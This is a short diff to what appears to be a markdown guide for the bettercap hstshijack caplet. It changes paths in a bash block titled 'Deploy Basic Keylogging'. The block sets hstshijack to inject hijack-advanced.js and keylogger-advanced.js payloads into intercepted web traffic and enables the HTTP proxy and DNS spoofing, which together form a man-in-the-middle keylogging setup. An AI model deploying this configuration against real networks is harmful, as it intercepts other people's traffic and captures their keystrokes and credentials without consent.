@@ -162,8 +162,8 @@ Reduces network footprint by ~70%:
 
 ### 1. **Deploy Basic Keylogging**
 ```bash
-# Edit ./hstshijack.cap
-set hstshijack.payloads *:./payloads/hijack-advanced.js,*:./payloads/keylogger-advanced.js
+# Edit /usr/share/bettercap/caplets/hstshijack.cap
+set hstshijack.payloads *:/usr/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,*:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js
 http.proxy on
 dns.spoof on
 ```
